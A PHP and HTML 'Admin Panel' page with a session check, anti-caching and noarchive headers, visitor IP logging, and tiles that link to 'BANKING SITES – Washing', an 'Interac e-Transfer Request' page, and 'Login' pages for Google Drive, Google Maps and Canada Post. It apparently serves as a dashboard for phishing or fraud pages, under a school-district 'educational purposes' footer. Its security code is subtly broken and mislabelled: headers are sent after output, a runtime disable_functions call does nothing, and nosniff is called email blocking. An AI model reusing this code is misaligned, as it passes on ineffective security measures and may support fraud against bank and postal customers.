<?php
session_start();

// Check if the user is logged in
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
  // Redirect the user to the login page or perform any other desired action
  header('Location: login.php');
  exit;
}
?>
<!DOCTYPE html>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
  <title>Admin Panel</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #333;
      margin: 0;
      padding: 0;
      color: #fff;
    }
    
    header {
      background-color: #222;
      padding: 10px;
      text-align: center;
    }
    
    h1 {
      margin: 0;
      font-size: 18px;
    }
    
    .container {
      padding: 20px;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
    }
    
    .item {
      background-color: #444;
      width: 150px;
      height: 150px;
      margin: 10px;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
      border-radius: 5px;
      box-shadow: 0px 2px 5px rgba(0, 0, 0, 0.3);
      cursor: pointer;
    }
    
    .item h2 {
      font-size: 16px;
      margin-top: 10px;
      margin-bottom: 5px;
    }
    
    .item p {
      font-size: 14px;
      color: #ccc;
    }
    
    .login-btn {
      background-color: #555;
      color: #fff;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      margin-top: 20px;
      cursor: pointer;
    }
    
    footer {
      background-color: #222;
      padding: 10px;
      text-align: center;
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
    }
    
    footer p {
      margin: 0;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <header>
    <button class="login-btn" onclick="location.href='login.html'">Login</button><h1>Admin Panel</h1>
  </header>
  <div class="container">
    <div class="item" onclick="location.href='item1.html'">
      <h2>CHAT GPT</h2>
      <p>AI CODE BOT</p>
    </div>
    <div class="item" onclick="location.href='item2.html'">
      <h2>SHORTCUTS</h2>
      <p>Shortcut Links</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>DODGE CANADA</h2>
      <p>Marketing</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>BANKING SITES</h2>
      <p>Washing</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>SOCIAL MEDIA</h2>
      <p>Marketing</p>
    </div>
    <div class="item" onclick="location.href='/admin/login.php'">
      <h2>Admin Login</h2>
      <p>Staff</p>
    </div>
    <div class="item" onclick="location.href='admin/sheets.php'">
      <h2>Attendance Sheets</h2>
      <p>Classrooms</p>
    </div>
    <div class="item" onclick="location.href='contact.html'">
      <h2>Contact Us</h2>
      <p>Contact</p>
    </div>
    <div class="item" onclick="location.href='/public/tswift/taco2.php'">
      <h2>Interac e-Transfer</h2>
      <p>Request</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>Google Maps</h2>
      <p>Login</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>Google Drive</h2>
      <p>Login</p>
    </div>
    <div class="item" onclick="location.href='item3.html'">
      <h2>Canada Post</h2>
      <p>Login</p>
    </div>
  </div>
  
  <footer>
    <p>© 2023 Alberta School District. Strictly for Educational Purposes Only!</p>
  </footer>
</body>
</html>